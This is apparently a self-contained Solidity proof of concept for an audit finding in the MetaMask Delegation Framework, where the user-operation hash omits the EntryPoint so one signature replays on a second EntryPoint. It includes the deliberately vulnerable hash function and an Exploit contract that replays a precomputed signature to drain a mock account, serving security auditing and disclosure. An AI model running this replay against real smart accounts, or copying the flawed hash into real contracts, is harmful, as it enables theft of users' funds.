// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  MetaMask Delegation Framework — EntryPoint omitted from the userOp hash
    (Cyfrin, AuditVault #55601). SYNTHETIC, cheatcode-free.

    DeleGatorCore.getPackedUserOperationHash (and the same function on
    EIP7702DeleGatorCore) hashes the packed userOp but not the EntryPoint.
    The EIP-712 domain binds chainId and the account (under EIP-7702,
    address(this) is the delegating EOA) and also omits the EntryPoint.
    ERC-4337 nonces live on the EntryPoint, so a second EntryPoint still
    has nonce 0. The same signature pays again.

    Reduction: that hash, plus one replay. The signer key is held; the
    signature below was precomputed offline for chainId 1 (no vm.sign).
    ACCOUNT stands in for the EIP-7702 EOA so the digest does not depend
    on this implementation's CREATE address. */

struct PackedUserOperation {
    address sender;
    uint256 nonce;
    bytes initCode;
    bytes callData;
    bytes32 accountGasLimits;
    uint256 preVerificationGas;
    bytes32 gasFees;
    bytes paymasterAndData;
    bytes signature;
}

interface IDeleGator {
    function validateUserOp(PackedUserOperation calldata userOp) external;
}

library Op {
    address internal constant ACCOUNT = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
    address internal constant BOB = 0xb0B0000000000000000000000000000000000B0B;
    uint256 internal constant PAYMENT = 1 ether;
}

contract DGUSD {
    string public constant name = "DeleGator USD";
    string public constant symbol = "DGUSD";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @dev Nonce lives here, not on the account. A second EntryPoint has its own nonce 0.
contract EntryPoint {
    IDeleGator public immutable account;
    mapping(address => uint256) public nonces;

    constructor(IDeleGator account_) {
        account = account_;
    }

    function handleOps(PackedUserOperation calldata userOp) external {
        if (userOp.nonce != nonces[userOp.sender]) revert("nonce");
        nonces[userOp.sender] = userOp.nonce + 1;
        account.validateUserOp(userOp);
    }
}

/// @dev Reduced DeleGatorCore / EIP7702DeleGatorCore. The hash body is the audited one.
contract DeleGatorCore is IDeleGator {
    /// @dev Domain verifyingContract is Op.ACCOUNT, the EIP-7702 EOA, not this implementation.
    string public constant NAME = "EIP7702StatelessDeleGator";
    string public constant DOMAIN_VERSION = "1";

    bytes32 public constant PACKED_USER_OP_TYPEHASH = keccak256(
        "PackedUserOperation(address sender,uint256 nonce,bytes initCode,bytes callData,bytes32 accountGasLimits,uint256 preVerificationGas,bytes32 gasFees,bytes paymasterAndData)"
    );
    bytes32 public constant DOMAIN_TYPEHASH =
        keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)");

    DGUSD public immutable token;

    constructor(DGUSD token_) {
        token = token_;
    }

    /// @dev Audited body. EntryPoint is not an argument and not a field.
    function getPackedUserOperationHash(PackedUserOperation calldata _userOp) public pure returns (bytes32) {
        // @> VULN: userOp hash omits the EntryPoint, so one signature replays on any EntryPoint
        return keccak256(
            abi.encode(
                PACKED_USER_OP_TYPEHASH,
                _userOp.sender,
                _userOp.nonce,
                keccak256(_userOp.initCode),
                keccak256(_userOp.callData),
                _userOp.accountGasLimits,
                _userOp.preVerificationGas,
                _userOp.gasFees,
                keccak256(_userOp.paymasterAndData)
            )
        );
        // FIX: abi.encode(..., keccak256(_userOp.paymasterAndData), entryPoint)
    }

    function _domainSeparatorV4() internal view returns (bytes32) {
        return keccak256(
            abi.encode(DOMAIN_TYPEHASH, keccak256(bytes(NAME)), keccak256(bytes(DOMAIN_VERSION)), block.chainid, Op.ACCOUNT)
        );
    }

    function getPackedUserOperationTypedDataHash(PackedUserOperation calldata _userOp) public view returns (bytes32) {
        bytes32 structHash = this.getPackedUserOperationHash(_userOp);
        return keccak256(abi.encodePacked(hex"1901", _domainSeparatorV4(), structHash));
    }

    function validateUserOp(PackedUserOperation calldata _userOp) external {
        bytes32 digest = this.getPackedUserOperationTypedDataHash(_userOp);
        address signer = _recover(digest, _userOp.signature);
        if (signer != Op.ACCOUNT) revert("sig");
        (address to, uint256 amount) = abi.decode(_userOp.callData, (address, uint256));
        if (!token.transfer(to, amount)) revert("transfer");
    }

    function _recover(bytes32 digest, bytes calldata signature) internal pure returns (address) {
        if (signature.length != 65) revert("siglen");
        bytes32 r;
        bytes32 s;
        uint8 v;
        assembly {
            r := calldataload(signature.offset)
            s := calldataload(add(signature.offset, 32))
            v := byte(0, calldataload(add(signature.offset, 64)))
        }
        return ecrecover(digest, v, r, s);
    }
}

contract Exploit {
    // Precomputed offline (cast wallet sign --no-hash) over the chainId-1 typed digest.
    // Signer is Op.ACCOUNT. No vm.sign in this file.
    bytes32 internal constant SIG_R = 0xe2b8e05c86f20ce98bc20448ae7c07520c58a862394fbefaeadb418e50235297;
    bytes32 internal constant SIG_S = 0x2de76eca128066bf8edfb6b5cc70732e14c0f16e8853a669ea3d4ebad458f138;
    uint8 internal constant SIG_V = 27;

    DGUSD public token; // CREATE nonce 1
    DeleGatorCore public account; // CREATE nonce 2
    EntryPoint public entryA; // CREATE nonce 3
    EntryPoint public entryB; // CREATE nonce 4

    uint256 public paidOnA;
    uint256 public replayed;

    constructor() {
        token = new DGUSD();
        account = new DeleGatorCore(token);
        entryA = new EntryPoint(account);
        entryB = new EntryPoint(account);
        token.mint(address(account), Op.PAYMENT * 2);
    }

    function userOp() public pure returns (PackedUserOperation memory op) {
        op.sender = Op.ACCOUNT;
        op.nonce = 0;
        op.initCode = hex"";
        op.callData = abi.encode(Op.BOB, Op.PAYMENT);
        op.accountGasLimits = bytes32(uint256(1));
        op.preVerificationGas = 21000;
        op.gasFees = bytes32(uint256(1));
        op.paymasterAndData = hex"";
        op.signature = abi.encodePacked(SIG_R, SIG_S, SIG_V);
    }

    function run() external {
        uint256 payment = Op.PAYMENT;
        PackedUserOperation memory op = userOp();
        uint256 beforeBal = token.balanceOf(Op.BOB);
        entryA.handleOps(op);
        paidOnA = token.balanceOf(Op.BOB) - beforeBal;
        if (paidOnA != payment) revert("first payment");
        entryB.handleOps(op);
        replayed = token.balanceOf(Op.BOB) - beforeBal - paidOnA;
        if (replayed != payment) revert("replay did not move funds");
        if (token.balanceOf(address(account)) != 0) revert("account not drained");
    }
}
